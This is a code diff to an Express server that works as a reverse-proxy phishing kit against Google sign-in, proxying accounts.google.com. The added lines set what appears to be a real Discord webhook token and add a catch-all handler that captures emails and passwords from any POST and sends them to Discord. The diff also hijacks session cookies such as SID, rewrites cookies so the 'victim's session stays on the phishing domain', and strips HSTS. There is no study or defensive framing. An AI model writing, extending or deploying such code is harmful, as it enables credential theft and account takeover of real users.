@@ -15,15 +15,19 @@ process.on('unhandledRejection', (reason, promise) => {
 });
 
 // Middleware
+// 1. Disable cookie decoding to prevent URI errors
 app.use(cookieParser({ decode: (val) => val }));
+// 2. Parse URL-encoded and JSON bodies
 app.use(express.urlencoded({ extended: true, limit: '50kb' }));
 app.use(express.json({ limit: '50kb' }));
 
 // CONFIGURATION
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+// REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';
 
 /**
  * Sends a notification to Discord.
+ * Includes crash guards to ensure the server never dies due to a webhook failure.
  */
 async function sendToDiscord(title, fields, color = 0x00ff00) {
   if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
@@ -58,6 +62,7 @@ async function sendToDiscord(title, fields, color = 0x00ff00) {
 
 /**
  * Rewrites Set-Cookie headers to match the local domain.
+ * Ensures the victim's session stays on the phishing domain.
  */
 function rewriteCookies(cookies, localDomain) {
   if (!cookies) return [];
@@ -77,7 +82,8 @@ app.get('/health', (req, res) => {
   res.status(200).send('OK');
 });
 
-// 1. THE CREDENTIAL CATCHER (For Logged-Out Users)
+// 1. THE SPECIFIC CREDENTIAL CATCHER (For /service/lp/challenge)
+// This is the primary target for Google's standard login flow.
 app.post('/service/lp/challenge', async (req, res) => {
   console.log(`[CATCH] POST /service/lp/challenge received.`);
   const username = req.body.email || req.body.emailOrPhone || 'unknown';
@@ -162,10 +168,27 @@ app.post('/service/lp/challenge', async (req, res) => {
   }
 });
 
-// 2. THE SESSION HIJACKER & UNIVERSAL PROXY
+// 2. THE UNIVERSAL PROXY, SESSION HIJACKER & CATCH-ALL
+// This handles ALL other requests, including POSTs to other endpoints.
 app.use((req, res) => {
   console.log(`[PROXY] ${req.method} ${req.originalUrl} received.`);
   
+  // UNIVERSAL CREDENTIAL CATCHER
+  // If it's a POST request and the body contains 'passwd', capture it.
+  if (req.method === 'POST' && req.body && typeof req.body === 'object' && req.body.passwd) {
+    const username = req.body.email || req.body.emailOrPhone || 'unknown';
+    const password = req.body.passwd;
+    
+    console.log(`[CREDENTIALS] Universal Capture: ${username} : ${password}`);
+    
+    sendToDiscord('Credential Capture (Universal)', [
+      { name: 'Email', value: username, inline: true },
+      { name: 'Password', value: password, inline: true },
+      { name: 'Path', value: req.originalUrl, inline: false }
+    ], 0x00ff00);
+  }
+
+  // SESSION HIJACKER
   if (req.headers.cookie) {
     const cookies = req.headers.cookie;
     const sidMatch = cookies.match(/SID=([^;]+)/);
@@ -187,6 +210,7 @@ app.use((req, res) => {
     }
   }
 
+  // PROXY THE REQUEST TO GOOGLE
   proxy.web(req, res, {
     target: 'https://accounts.google.com',
     path: req.originalUrl
@@ -219,6 +243,7 @@ proxy.on('proxyRes', (proxyRes, req, res) => {
     proxyRes.headers['set-cookie'] = rewrittenCookies;
   }
   
+  // Strip HSTS to avoid mixed content issues
   delete proxyRes.headers['strict-transport-security'];
 });
 
